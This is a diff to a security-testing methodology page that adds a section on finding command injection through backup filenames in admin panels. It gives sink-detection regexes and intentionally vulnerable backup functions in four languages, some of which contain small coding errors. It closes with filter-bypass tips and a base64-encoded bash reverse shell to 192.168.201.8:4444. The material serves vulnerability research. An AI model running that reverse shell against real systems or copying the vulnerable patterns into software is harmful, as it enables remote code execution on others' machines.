@@ -526,25 +526,25 @@ Check whether the value read from the configuration is properly sanitized or esc
 {% tabs %}
 {% tab title="C#" %}
 ```regexp
-ProcessStartInfo|Process\.Start|cmd\.exe|powershell\.exe
+(ProcessStartInfo)|(Process\.Start)|(cmd\.exe)|(powershell\.exe)
 ```
 {% endtab %}
 
 {% tab title="Java" %}
 ```regexp
-Runtime\.getRuntime\(\)\.exec|ProcessBuilder\s*\(|getParameter\s*\(
+(Runtime\.getRuntime\(\)\.exec)|(ProcessBuilder\s*\()|(getParameter\s*\()
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```regexp
-\$_(GET|POST|REQUEST|FILES)|exec\s*\(|shell_exec\s*\(|system\s*\(|passthru\s*\(|popen\s*\(
+(\$_(GET|POST|REQUEST|FILES))|(exec\s*\()|(shell_exec\s*\()|(system\s*\()|(passthru\s*\()|(popen\s*\()
 ```
 {% endtab %}
 
 {% tab title="Node.js" %}
 ```regexp
-child_process|exec\s*\(|spawn\s*\(|execSync\s*\(
+(child_process)|(exec\s*\()|(spawn\s*\()|(execSync\s*\()
 ```
 {% endtab %}
 {% endtabs %}
@@ -746,31 +746,410 @@ Important note: **this vulnerability occurs when a report is created and then ex
 
 ***
 
-####
+#### Command Injection via Backup Filename
 
 {% stepper %}
 {% step %}
-
+Identify the target product, then locate Backup, Restore, Export, or filesystem operation modules in the administrative panel
 {% endstep %}
 
 {% step %}
-
+Find the paths where the user can enter the filename, backup name, storage path, or similar values
 {% endstep %}
 
 {% step %}
-
+In the source code, locate the files related to the Backup functionality and inspect the main backup creation functions
 {% endstep %}
 
 {% step %}
+Trace the user input flow in the source code until the backup filename processing stage, and at the processing point look for the use of system functions
 
+**VSCode (Regex Detection)**
+
+{% tabs %}
+{% tab title="C#" %}
+```regexp
+(ProcessStartInfo)|(Process\.Start)|(cmd\.exe)|(powershell\.exe)
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```regexp
+(Runtime\.getRuntime\(\)\.exec)|(ProcessBuilder\s*\()|(getParameter\s*\()
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```regexp
+(\$_(GET|POST|REQUEST|FILES))|(exec\s*\()|(shell_exec\s*\()|(system\s*\()|(passthru\s*\()|(popen\s*\()
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```regexp
+(child_process)|(exec\s*\()|(spawn\s*\()|(execSync\s*\()
+```
+{% endtab %}
+{% endtabs %}
+
+**RipGrep (Regex Detection(Linux))**
+
+{% tabs %}
+{% tab title="C#" %}
+```regexp
+ProcessStartInfo|Process\.Start|cmd\.exe|powershell\.exe
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```regexp
+Runtime\.getRuntime\(\)\.exec|ProcessBuilder\s*\(|getParameter\s*\(
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```regexp
+\$_(GET|POST|REQUEST|FILES)|exec\s*\(|shell_exec\s*\(|system\s*\(|passthru\s*\(|popen\s*\(
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```regexp
+child_process|exec\s*\(|spawn\s*\(|execSync\s*\(
+```
+{% endtab %}
+{% endtabs %}
+
+**Vulnerable Code Pattern**
+
+{% tabs %}
+{% tab title="C#" %}
+```csharp
+// begin vulnerable code section
+public void CreateBackup(string name, int mode, ref string real_name, bool from_programming = false) {
+    var config = Global.config;
+
+    var time = DateTime.Now;
+    string formatted_time = time.ToString("dd-MM-yy-hh-mm-ss");
+
+    if (real_name == "") {
+        string name_without_blank = safe_output(name).Replace(" ", "_space_");
+        //real_name = "IntegriaBackup---" + 0 + "---" + mode + "---" + name_without_blank + "---" + MD5(rand(1000, 1000000000)).Substring(10) + "---" + formatted_time;
+        real_name = "IB---" + 0 + "---" + mode + "---" + name_without_blank + "---" + formatted_time;
+    }
+
+    string sqlfile = "";
+    string attachmentsfile = "";
+
+    switch (mode) {
+        case 0:
+            sqlfile = "db_backup_" + real_name + ".sql";
+            break;
+
+        case 1:
+            attachmentsfile = BACKUP_FULLPATH + "/" + "attachments_backup_" + real_name + "/";
+            System.IO.Directory.CreateDirectory(attachmentsfile);
+            break;
+
+        case 2:
+            sqlfile = "db_backup_" + real_name + ".sql";
+
+            attachmentsfile = BACKUP_FULLPATH + "/" + "attachments_backup_" + real_name + "/";
+            System.IO.Directory.CreateDirectory(attachmentsfile);
+            break;
+    }
+
+    string uname = System.Runtime.InteropServices.RuntimeInformation.OSDescription;
+    bool so_win = System.Text.RegularExpressions.Regex.IsMatch(uname, "(.)*Windows(.)*", System.Text.RegularExpressions.RegexOptions.IgnoreCase);
+
+    string command_copy;
+
+    if (so_win) {
+        config["homedir"] = config["homedir"].Replace("/", "\\");
+        command_copy = string.Format("xcopy " + config["homedir"] + "attachment\\* {0} ", attachmentsfile);
+    }
+    else {
+        command_copy = string.Format("cp -r " + config["homedir"] + "attachment/* {0} ", attachmentsfile);
+    }
+
+    bool process = true;
+
+    if (sqlfile != "") {
+        string command;
+
+        if (config["dbpass"] == "") {
+            command = string.Format("mysqldump -h {0} -u {1} {2} > {3} ",
+                config["dbhost"],
+                config["dbuser"],
+                config["dbname"],
+                sqlfile);
+        } else {
+            command = string.Format("mysqldump -h {0} -u {1} -p{2} {3} > {4} ",
+                config["dbhost"],
+                config["dbuser"],
+                config["dbpass"],
+                config["dbname"],
+                sqlfile);
+        }
+
+        // this is where the actual RCE gets executed
+        System.Diagnostics.Process.Start(command);
+    }
+
+    // this is where the actual RCE gets executed
+    if (attachmentsfile != "") {
+        var result = System.Diagnostics.Process.Start(command_copy);
+    }
+}
+// end vulnerable code section
+```
+{% endtab %}
+
+{% tab title="Java" %}
+<pre class="language-java"><code class="lang-java">// begin vulnerable code section
+<strong>public void create_backup(String name, int mode, String[] real_name, boolean from_programming) {
+</strong>    var config = Global.config;
+
+    var time = java.time.LocalDateTime.now();
+    String formatted_time = time.format(java.time.format.DateTimeFormatter.ofPattern("dd-MM-yy-hh-mm-ss"));
+
+    if (real_name[0].equals("")) {
+        String name_without_blank = safe_output(name).replace(" ", "_space_");
+        //real_name[0] = "IntegriaBackup---" + 0 + "---" + mode + "---" + name_without_blank + "---" + MD5(rand(1000, 1000000000)).substring(10) + "---" + formatted_time;
+        real_name[0] = "IB---" + 0 + "---" + mode + "---" + name_without_blank + "---" + formatted_time;
+    }
+
+    String sqlfile = "";
+    String attachmentsfile = "";
+
+    switch (mode) {
+        case 0:
+            sqlfile = "db_backup_" + real_name[0] + ".sql";
+            break;
+
+        case 1:
+            attachmentsfile = BACKUP_FULLPATH + "/" + "attachments_backup_" + real_name[0] + "/";
+            new java.io.File(attachmentsfile).mkdir();
+            break;
+
+        case 2:
+            sqlfile = "db_backup_" + real_name[0] + ".sql";
+
+            attachmentsfile = BACKUP_FULLPATH + "/" + "attachments_backup_" + real_name[0] + "/";
+            new java.io.File(attachmentsfile).mkdir();
+            break;
+    }
+
+    String uname = System.getProperty("os.name");
+    boolean so_win = uname.matches("(.)*Windows(.)*");
+
+    String command_copy;
+
+    if (so_win) {
+        config.put("homedir", config.get("homedir").replace("/", "\\\\"));
+        command_copy = String.format("xcopy " + config.get("homedir") + "attachment\\* %s ", attachmentsfile);
+    }
+    else {
+        command_copy = String.format("cp -r " + config.get("homedir") + "attachment/* %s ", attachmentsfile);
+    }
+
+    boolean process = true;
+
+    if (!sqlfile.equals("")) {
+        String command;
+
+        if (config.get("dbpass").equals("")) {
+            command = String.format("mysqldump -h %s -u %s %s > %s ",
+                config.get("dbhost"),
+                config.get("dbuser"),
+                config.get("dbname"),
+                sqlfile);
+        } else {
+            command = String.format("mysqldump -h %s -u %s -p%s %s > %s ",
+                config.get("dbhost"),
+                config.get("dbuser"),
+                config.get("dbpass"),
+                config.get("dbname"),
+                sqlfile);
+        }
+
+        // this is where the actual RCE gets executed
+        Runtime.getRuntime().exec(command);
+    }
+
+    // this is where the actual RCE gets executed
+    if (!attachmentsfile.equals("")) {
+        Process result = Runtime.getRuntime().exec(command_copy);
+    }
+}
+// end vulnerable code section
+</code></pre>
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+// begin vulnerable code section
+function create_backup ($name, $mode, &$real_name, $from_programming = false) {
+        global $config;
+
+        $time = new DateTime('now');
+        $time = $time->format("d-m-y-h-i-s");
+
+        if ($real_name == "") {
+                $name_without_blank = str_replace(" ", "_space_", safe_output($name));
+                //$real_name = "IntegriaBackup---" . 0 . "---" . $mode . "---" . $name_without_blank . "---" . substr(MD5(rand(1000, 1000000000)), 10) . "---" . $time;
+                $real_name = "IB---" . 0 . "---" . $mode . "---" . $name_without_blank. "---". $time;
+        }
+
+        $sqlfile = "";
+        $attachmentsfile = "";
+
+        switch ($mode) {
+                case 0:
+                        $sqlfile = "db_backup_" . $real_name . ".sql";
+                        break;
+
+                case 1:
+                        $attachmentsfile = BACKUP_FULLPATH . '/' . "attachments_backup_" . $real_name . "/";
+                        mkdir($attachmentsfile);
+                        break;
+
+                case 2:
+                        $sqlfile = "db_backup_" . $real_name . ".sql";
+
+                        $attachmentsfile = BACKUP_FULLPATH . '/' . "attachments_backup_" . $real_name . "/";
+                        mkdir($attachmentsfile);
+                        break;
+        }
+
+        $uname = php_uname();
+        $so_win = preg_match("/(.)*Windows(.)*/i",$uname);
+
+        if ($so_win) {
+                $config['homedir'] = str_replace("/", "\\", $$config['homedir']);
+                $command_copy = sprintf ('xcopy ' . $config['homedir'] . 'attachment\* %s ', $attachmentsfile);
+        }
+        else {
+                $command_copy = sprintf ('cp -r ' . $config['homedir'] . 'attachment/* %s ', $attachmentsfile);
+        }
+
+        $process = true;
+
+        if ($sqlfile != "") {
+                if ($config["dbpass"] == "") {
+                        $command = sprintf ('mysqldump -h %s -u %s %s > %s ', $config['dbhost'], $config['dbuser'], $config['dbname'],$sqlfile);
+                } else {
+                        $command = sprintf ('mysqldump -h %s -u %s -p%s %s > %s ',$config['dbhost'], $config['dbuser'],$config['dbpass'], $config['dbname'],$sqlfile);
+                }
+
+                // this is where the actual RCE gets executed
+                exec($command);
+        }
+
+        // this is where the actual RCE gets executed
+        if ($attachmentsfile != "") {
+                $result = exec($command_copy);
+        }
+}
+// end vulnerable code section
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```javascript
+// begin vulnerable code section
+const { execSync } = require('child_process');
+
+function create_backup(name, mode, real_name, from_programming = false) {
+        const config = global.config;
+
+        let time = new Date();
+
+        let formatted_time =
+            time.getDate() + "-" +
+            (time.getMonth() + 1) + "-" +
+            time.getFullYear().toString().slice(-2) + "-" +
+            time.getHours() + "-" +
+            time.getMinutes() + "-" +
+            time.getSeconds();
+
+        if (real_name == "") {
+                let name_without_blank = safe_output(name).replace(/ /g, "_space_");
+                //real_name = "IntegriaBackup---" + 0 + "---" + mode + "---" + name_without_blank + "---" + MD5(rand(1000, 1000000000)).substr(10) + "---" + formatted_time;
+                real_name = "IB---" + 0 + "---" + mode + "---" + name_without_blank + "---" + formatted_time;
+        }
+
+        let sqlfile = "";
+        let attachmentsfile = "";
+
+        switch (mode) {
+                case 0:
+                        sqlfile = "db_backup_" + real_name + ".sql";
+                        break;
+
+                case 1:
+                        attachmentsfile = BACKUP_FULLPATH + '/' + "attachments_backup_" + real_name + "/";
+                        require('fs').mkdirSync(attachmentsfile);
+                        break;
+
+                case 2:
+                        sqlfile = "db_backup_" + real_name + ".sql";
+
+                        attachmentsfile = BACKUP_FULLPATH + '/' + "attachments_backup_" + real_name + "/";
+                        require('fs').mkdirSync(attachmentsfile);
+                        break;
+        }
+
+        let uname = process.platform;
+        let so_win = /(.)*Windows(.)*/i.test(uname);
+
+        let command_copy;
+
+        if (so_win) {
+                config['homedir'] = config['homedir'].replace(/\//g, "\\");
+                command_copy = `xcopy ${config['homedir']}attachment\\* ${attachmentsfile} `;
+        }
+        else {
+                command_copy = `cp -r ${config['homedir']}attachment/* ${attachmentsfile} `;
+        }
+
+        let process_exec = true;
+
+        if (sqlfile != "") {
+                let command;
+
+                if (config["dbpass"] == "") {
+                        command = `mysqldump -h ${config['dbhost']} -u ${config['dbuser']} ${config['dbname']} > ${sqlfile} `;
+                } else {
+                        command = `mysqldump -h ${config['dbhost']} -u ${config['dbuser']} -p${config['dbpass']} ${config['dbname']} > ${sqlfile} `;
+                }
+
+                // this is where the actual RCE gets executed
+                execSync(command);
+        }
+
+        // this is where the actual RCE gets executed
+        if (attachmentsfile != "") {
+                let result = execSync(command_copy);
+        }
+}
+// end vulnerable code section
+```
+{% endtab %}
+{% endtabs %}
 {% endstep %}
 
 {% step %}
+If restrictions exist, test bypass methods such as `${IFS}`, Base64 Encoding, or Command Chaining
 
+```bash
+echo -n "bash -i >& /dev/tcp/192.168.201.8/4444 0>&1"|base64 -w0
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMS44LzQ0NDQgMD4mMQ==
+```
 {% endstep %}
 
 {% step %}
-
+Then send the request, and if a request is made to your server, the vulnerability is confirmed
 {% endstep %}
 {% endstepper %}
 
